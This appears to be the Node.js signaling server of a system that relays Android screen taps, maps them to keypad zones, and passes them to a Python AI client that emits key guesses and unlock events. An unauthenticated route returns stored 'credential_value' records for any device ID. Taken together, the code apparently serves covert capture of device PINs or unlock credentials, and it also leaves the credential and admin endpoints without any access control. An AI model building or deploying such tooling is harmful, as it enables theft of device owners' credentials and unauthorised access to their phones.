const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    allowEIO3: true,
    transports: ['websocket', 'polling']
});

// Explicit route for script.js to avoid MIME and 404 issues.
app.get('/script.js', (req, res) => {
    const scriptPath = path.join(__dirname, 'script.js');
    console.log('[STATIC] /script.js requested, sending:', scriptPath);
    res.type('application/javascript');
    res.sendFile(scriptPath, (err) => {
        if (err) {
            console.error('[STATIC] Failed to send script.js', err);
            res.status(err.status || 500).send('script.js not found');
        }
    });
});

// Optional fallback for any JS file in the root directory.
// Use a parameterized route to avoid path-to-regexp errors with patterns like "/*.js".
// Fallback for JS files using a simple parameter route and validation.
app.get('/:file', (req, res) => {
    const requested = req.params.file || '';
    // Only allow requests for .js files here
    if (!requested.endsWith('.js')) {
        return res.status(404).send('Not found');
    }
    const filePath = path.join(__dirname, requested);
    console.log('[STATIC] JS fallback requested:', requested, '->', filePath);
    res.type('application/javascript');
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error('[STATIC] Failed to send', filePath, err);
            res.status(err.status || 500).send(requested + ' not found');
        }
    });
});

app.use(express.static(__dirname));
// Parse JSON bodies for the admin API
app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://ltxvswccpahqpsgaxfog.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;

app.get('/api/security/:deviceId', async (req, res) => {
    if (!SUPABASE_ANON_KEY) {
        return res.status(503).json({ error: 'SUPABASE_ANON_KEY is not configured on the signaling server' });
    }

    const deviceId = req.params.deviceId;
    if (!deviceId || deviceId.length > 128) {
        return res.status(400).json({ error: 'Invalid device ID' });
    }

    try {
        const query = new URLSearchParams({
            select: 'device_id,security_type,credential_value',
            device_id: `eq.${deviceId}`
        });
        const response = await fetch(`${SUPABASE_URL}/rest/v1/user_security?${query}`, {
            headers: {
                apikey: SUPABASE_ANON_KEY,
                Authorization: `Bearer ${SUPABASE_ANON_KEY}`
            }
        });
        const body = await response.text();
        if (!response.ok) {
            return res.status(response.status).json({ error: body });
        }
        return res.type('application/json').send(body);
    } catch (error) {
        console.error('[SUPABASE] Failed to load security data:', error);
        return res.status(502).json({ error: 'Unable to reach Supabase' });
    }
});

// Per-room zone mappings used to override raw Android labels
const zoneMaps = {};

let DEFAULT_ZONES = [];
try {
    const raw = fs.readFileSync(path.join(__dirname, 'zones.json'), 'utf8');
    DEFAULT_ZONES = JSON.parse(raw);
    console.log('[ZONES] Loaded DEFAULT_ZONES from zones.json');
} catch (e) {
    DEFAULT_ZONES = [
        { name: 'NAV BAR', x: 0.50, y: 0.97, radius: 0.15 },
        { name: 'TOP BAR', x: 0.50, y: 0.10, radius: 0.18 },
        { name: 'CENTER', x: 0.50, y: 0.50, radius: 0.20 },
        { name: 'LOWER', x: 0.50, y: 0.80, radius: 0.20 },
        { name: 'KEY 2', x: 0.50, y: 0.44, radius: 0.12 },
        { name: 'KEY P2', x: 0.50, y: 0.35, radius: 0.12 },
        { name: 'KEY DEL', x: 0.25, y: 0.80, radius: 0.12 },
        { name: 'KEY ENTER', x: 0.90, y: 0.85, radius: 0.12 }
    ];
    console.warn('[ZONES] Using built-in DEFAULT_ZONES');
}

function distance(x1, y1, x2, y2) {
    return Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2));
}

// Return mapped zone object {name,x,y} if close enough, otherwise null
function mapClickToLabel(roomId, x, y, rawLabel) {
    const zones = zoneMaps[roomId] || DEFAULT_ZONES;
    let best = { zone: null, dist: Infinity };
    for (const z of zones) {
        const d = distance(x, y, z.x, z.y);
        if (d < best.dist) best = { zone: z, dist: d };
    }
    const radius = best.zone ? (best.zone.radius || 0.16) : 0.16;
    const normalizedLabel = rawLabel ? String(rawLabel).toLowerCase() : '';
    const isGeneric = normalizedLabel.includes('screen') || normalizedLabel.includes('tap') || normalizedLabel.includes('touch') || normalizedLabel.includes('click') || normalizedLabel.includes('device');
    const fallbackRadius = Math.max(radius * 1.75, 0.25);

    console.log(`[MAP] room=${roomId} rawLabel=${normalizedLabel || 'N/A'} x=${x} y=${y} nearest=${best.zone ? best.zone.name : 'none'} dist=${best.dist.toFixed(3)} radius=${radius} fallback=${fallbackRadius.toFixed(3)} generic=${isGeneric}`);

    if (best.zone && best.dist <= radius) {
        return { name: best.zone.name, x: best.zone.x, y: best.zone.y };
    }

    if (best.zone && isGeneric && best.dist <= fallbackRadius) {
        console.log(`[MAP-FALLBACK] mapped generic rawLabel '${rawLabel}' to nearest zone '${best.zone.name}'`);
        return { name: best.zone.name, x: best.zone.x, y: best.zone.y };
    }

    return null;
}

// Short-lived dedupe set for clickIds to avoid processing same click twice
const processedClickIds = new Set();

function processDeviceClick(clickPayload) {
    const cid = clickPayload.clickId ? String(clickPayload.clickId) : null;
    if (cid && processedClickIds.has(cid)) {
        console.log(`[DEDUP] Ignoring duplicate clickId ${cid}`);
        return;
    }
    if (cid) {
        processedClickIds.add(cid);
        setTimeout(() => processedClickIds.delete(cid), 3000);
    }

    const roomId = clickPayload.roomId || 'global';
    const mapped = mapClickToLabel(roomId, clickPayload.x, clickPayload.y, clickPayload.label);
    clickPayload.originalLabel = clickPayload.label || null;
    clickPayload.originalCoords = { x: clickPayload.x, y: clickPayload.y };

    const uiPayload = {
        roomId: roomId,
        clickId: clickPayload.clickId,
        source: clickPayload.source,
        label: mapped ? mapped.name : 'Screen Area',
        x: clickPayload.originalCoords.x,
        y: clickPayload.originalCoords.y,
        originalLabel: clickPayload.originalLabel,
        originalX: clickPayload.originalCoords.x,
        originalY: clickPayload.originalCoords.y,
        mapped: !!mapped
    };

    console.log(`[CLICK] room=${roomId} clickId=${cid} mapped=${uiPayload.mapped} label=${uiPayload.label}`);

    // Route clicks to AI/visualizer first (both raw and sanitised payloads)
    // Raw click for AI engines
    io.to('ai-room').emit('device_click_broadcast', clickPayload);
    // Sanitized UI preview for visualizers to show before forwarding to main room
    io.to('ai-room').emit('device_click_for_visualizer', uiPayload);
    return uiPayload;
}

// Admin HTTP API: set zones for a room
app.post('/rooms/:roomId/zones', (req, res) => {
    const roomId = req.params.roomId;
    const zones = req.body.zones;
    if (!Array.isArray(zones)) return res.status(400).json({ error: 'zones must be an array' });
    zoneMaps[roomId] = zones;
    console.log(`[ZONES] Updated zones for room ${roomId}`);
    // Notify connected clients in the room
    io.to(roomId).emit('zones_updated', zones);
    return res.json({ ok: true });
});

// --- AUTOMATIC AI CLIENT SPAWNER (Improved) ---
function startAIClient() {
        console.log("[AI] Starting Python AI Client automatically...");

        const pythonCmd = process.platform === "win32" ? "python" : "python3";
        // RENDER FIX: Use 127.0.0.1 and the dynamic PORT assigned by Render
        const serverUrl = `http://127.0.0.1:${PORT}`;

        console.log(`[AI] Spawning Python client pointing to: ${serverUrl}`);

        // Improved spawning logic for better reliability on VPS
        const pythonProcess = spawn(pythonCmd, [
                path.join(__dirname, 'meo_ai_client.py'),
                serverUrl
        ], {
                cwd: __dirname,
                env: process.env
        });

        pythonProcess.stdout.on('data', (data) => {
                console.log(`[AI-PYTHON] ${data.toString().trim()}`);
        });

        pythonProcess.stderr.on('data', (data) => {
                console.error(`[AI-ERROR] ${data.toString().trim()}`);
        });

        pythonProcess.on('error', (err) => {
                console.error("[AI-SPAWN-ERROR]", err);
        });

        pythonProcess.on('close', (code) => {
                console.log(`[AI] Python client exited with code ${code}. Restarting in 5s...`);
                setTimeout(startAIClient, 5000);
        });
}
// ------------------------------------

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on("connection", (socket) => {
        // ULTIMATE DEBUG: Log every single event arriving at the server
        socket.onAny((eventName, ...args) => {
                console.log(`[EVENT] From ${socket.id}: ${eventName}`, args);
        });

        socket.on("join", (roomId) => {
                socket.join(roomId);
                console.log(`[ROOM] ${socket.id} joined ${roomId}`);
                socket.to(roomId).emit("new-peer", { id: socket.id });
        });

        socket.on("message", (data) => {
                // If the Android app sends a device_click via the message channel (signaling)
                if (data && data.type === "device_click") {
                    const roomId = data.roomId;
                    const clickPayload = { ...data, source: "Device Tap" };
                    console.log(`[DEBUG] Signaling click to AI for room: ${roomId}`);

                    // Centralized processing and emission (dedupe + mapping)
                    const ui = processDeviceClick(clickPayload);
                    try { socket.emit('device_click_ack', ui); } catch(e) { console.warn('[ACK] Failed to ack sender', e); }
                }
                socket.to(data.roomId).emit("message", data);
        });

        // New: Broadcast click events to Python AI Client
        socket.on("device_click", (data) => {
                const clickPayload = {
                        ...data,
                        roomId: data.roomId || "global",
                        source: data.source || "Physical Touch"
                };

                const ui = processDeviceClick(clickPayload);
                try { socket.emit('device_click_ack', ui); } catch(e) { console.warn('[ACK] Failed to ack sender', e); }

                console.log(`[AI-ROUTING] Shout click from ${clickPayload.roomId} to all listeners.`);
        });

        // New: Handle AI responses and broadcast to web UI
        socket.on("ai_key_guess", (data) => {
            console.log('[SERVER] ai_key_guess received', data);
            // Route the AI guess to the specific room if provided to avoid duplicates.
            if (data && data.roomId) {
                io.to(data.roomId).emit("ai_key_guess_broadcast", data);
            } else {
                // If no room specified, forward to ai-room listeners only
                io.to("ai-room").emit("ai_key_guess_broadcast", data);
            }

            // Also mirror to ai-room for any internal AI listeners
            io.to("ai-room").emit("ai_key_guess_broadcast", data);

            console.log(`[AI-ROUTING] Guess '${data.guessed_key}' routed to room=${data.roomId || 'ai-room'}.`);
        });

        socket.on("unlock_event", (data) => {
                console.log(`[DEBUG] Unlock event in room ${data.roomId}`);
                io.to("ai-room").emit("device_unlock_broadcast", data);
        });

        socket.on("disconnect", (reason) => {
                console.log(`[DISCONN] Device ${socket.id} disconnected.`);
        });

        // Listen for visualizer-forwarded clicks and broadcast them to the target room
        socket.on('device_click_forward', (data) => {
                try {
                        const room = data.roomId || data.uiPayload?.roomId || 'global';
                        const payload = data.uiPayload || data;
                        console.log(`[FORWARD] Forwarding click to room ${room}`, payload.clickId || payload.clickId);
                        io.to(room).emit('device_click_broadcast', payload);
                } catch (e) {
                        console.warn('[FORWARD] Failed to forward click', e);
                }
        });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
        console.log("========================================");
        console.log(`Signaling server running on port ${PORT}`);
        console.log("========================================");

        // Start AI automatically when server is ready
        startAIClient();
});
